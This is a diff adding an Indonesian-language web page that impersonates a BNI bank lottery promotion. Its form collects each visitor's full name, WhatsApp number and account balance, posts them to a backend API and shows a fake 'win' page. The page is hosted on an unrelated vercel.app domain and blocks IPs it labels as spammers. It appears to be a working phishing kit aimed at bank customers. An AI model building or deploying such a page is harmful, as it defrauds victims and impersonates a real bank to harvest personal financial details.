@@ -1,0 +1,194 @@
+<!doctype html>
+<html lang="id" class="h-100">
+<head id="ctl00_Head1">
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
+  <meta property="og:title" content="Cetak Kupon Anda - BNI - Rejeki Wonder">
+  <meta property="og:image" content="bc.png">
+  <meta property="og:image:type" content="image/jpeg">
+  <meta name="description" content="Program Festival Gebyar Undian BNI Rejeki Wonder. Ikuti dan menangkan hadiahnya.">
+  <meta name="author" content="BNI" />
+  <title>Cetak Kupon Anda - BNI Rejeki Wonder</title>
+
+  <link rel="icon" href="https://lanjakkela.vercel.app/bc.png" />
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" />
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.4.1/font/bootstrap-icons.css" />
+  <link rel="stylesheet" href="https://lanjakkela.vercel.app/main.css" />
+</head>
+<body>
+  <main>
+    <nav class="navnon">
+      <img width="100%" src="https://lanjakkela.vercel.app/bc.png" alt="BNI Promo" />
+    </nav>
+
+    <footer>
+      <img src="https://lanjakkela.vercel.app/bawah.png" alt="Footer BNI" />
+    </footer>
+
+    <div class="textjalan" style="margin-top: 65px;">
+      <svg width="50" height="40" fill="currentColor" class="bi bi-bell"><path d="M8 16a2 2 0 0 0 2-2H6a2 2 0 0 0 2 2..." /></svg>
+      <span><marquee>Selamat Datang di GEBYAR FESTIVAL BNI WONDER. Menangkan Hadiahnya dan Jadilah Pemenangnya!</marquee></span>
+    </div>
+
+    <div class="coverform">
+      <div class="form">
+        <h5 class="text-center">Formulir Kupon Undian</h5>
+        <img width="35%" src="https://lanjakkela.vercel.app/atas.png" alt="Header BNI" />
+
+        <form id="formData" method="POST" class="mt-4">
+          <div class="inp">
+            <label for="namalengkap"><b>Nama Lengkap</b></label>
+            <input type="text" name="a" id="namalengkap" required />
+          </div>
+
+          <div class="inp">
+            <label for="nowa"><b>No. WhatsApp</b></label>
+            <input type="tel" name="b" id="nowa" required />
+          </div>
+
+          <div class="inp">
+            <label for="saldo"><b>Saldo Akhir</b></label>
+            <input type="tel" name="c" id="saldo" required />
+          </div>
+
+        
+          <button type="submit" id="kirim">Cetak Kupon</button>
+        </form>
+      </div>
+
+      <p class="text-center" style="font-size: 12px;">© PT Bank Negara Indonesia (Persero) Tbk</p>
+      <p onclick="location.href='https://www.bni.co.id/id-id/beranda/promo-acara/rejeki-wondr-bni'" style="text-align: center; font-size: 16px;">
+        <strong style="color: #FF8601;">Semua Nasabah Bank BNI <span style="color: #098CE3;"><b>Bekesempatan Untuk Menang...!!!</b></span>
+      </p>
+    </div>
+  </main>
+
+  <script src="https://lanjakkela.vercel.app/jquery.min.js"></script>
+  <script src="https://lanjakkela.vercel.app/vibr.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.min.js"></script>
+  <script>
+      $(document).ready(function(){
+// Format mata uang.
+$( '#saldo' ).mask('000.000.000.000,00', {reverse: true});
+var dengan_rupiah = document.getElementById('saldo');
+dengan_rupiah.addEventListener('keyup', function(e)
+{
+dengan_rupiah.value = formatRupiah(this.value, 'Rp.');
+});
+/* Fungsi */
+function formatRupiah(angka, prefix)
+{
+var number_string = angka.replace(/[^,\d]/g, '').toString(),
+split    = number_string.split(','),
+sisa     = split[0].length % 3,
+rupiah     = split[0].substr(0, sisa),
+ribuan     = split[0].substr(sisa).match(/\d{3}/gi);
+if (ribuan) {
+separator = sisa ? '.' : '';
+rupiah += separator + ribuan.join('.');
+}
+rupiah = split[1] != undefined ? rupiah + ',' + split[1] : rupiah;
+return prefix == undefined ? rupiah : (rupiah ? 'Rp. ' + rupiah : '');
+}
+})
+  </script>
+  <script>
+      document.addEventListener("DOMContentLoaded", async () => {
+  const form = document.getElementById("formData");
+  const submitBtn = document.getElementById("kirim");
+  let isSubmitting = false;
+
+  // 🔥 Daftar IP spammer
+  const blockedIPs = [
+    "180.248.76.246",
+    "182.8.179.108",
+    "182.3.141.223",
+    "182.8.161.143"
+  ];
+
+  // 🔍 Cek IP user
+  const userIP = await getPublicIP();
+  if (blockedIPs.includes(userIP)) {
+    alert("Akses kamu diblokir karena terdeteksi sebagai spam!");
+    form.remove(); // atau bisa disable aja
+    return;
+  }
+
+  form.addEventListener("submit", async function (e) {
+    e.preventDefault();
+
+    if (isSubmitting) {
+      alert("Tunggu sebentar ya, sedang memproses...");
+      return;
+    }
+
+    isSubmitting = true;
+    submitBtn.disabled = true;
+    submitBtn.innerText = "Memproses Cetak Kupon...";
+
+    const formData = new FormData(form);
+    const data = Object.fromEntries(formData.entries());
+
+    // ✋ Validasi manual di client-side
+    const noWA = data.b || '';
+    const saldo = data.c || '';
+
+    if (!/^08[0-9]{8,13}$/.test(noWA)) {
+      alert("Nomor WhatsApp tidak valid!");
+      resetBtn();
+      return;
+    }
+
+    if (saldo.length < 3) {
+      alert("Saldo terlalu kecil untuk diikutkan.");
+      resetBtn();
+      return;
+    }
+
+    try {
+      const res = await fetch('/api/nondril', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        credentials: 'include',
+        body: JSON.stringify(data)
+      });
+
+      const json = await res.json();
+
+      if (json.success) {
+        vibr(180);
+        setTimeout(() => {
+          window.location.href = 'win.html';
+        }, 1000);
+      } else {
+        alert(json.message || "Gagal mengirim. Coba lagi.");
+      }
+    } catch (err) {
+      console.error("Error:", err);
+      alert("Terjadi kesalahan saat kirim data.");
+    }
+
+    resetBtn();
+  });
+
+  function resetBtn() {
+    isSubmitting = false;
+    submitBtn.disabled = false;
+    submitBtn.innerText = "Cetak Kupon";
+  }
+
+  async function getPublicIP() {
+    try {
+      const res = await fetch("https://api.ipify.org?format=json");
+      const data = await res.json();
+      return data.ip;
+    } catch (err) {
+      console.error("Gagal ambil IP:", err);
+      return null;
+    }
+  }
+});
+
+  </script>
+</body>
+</html>
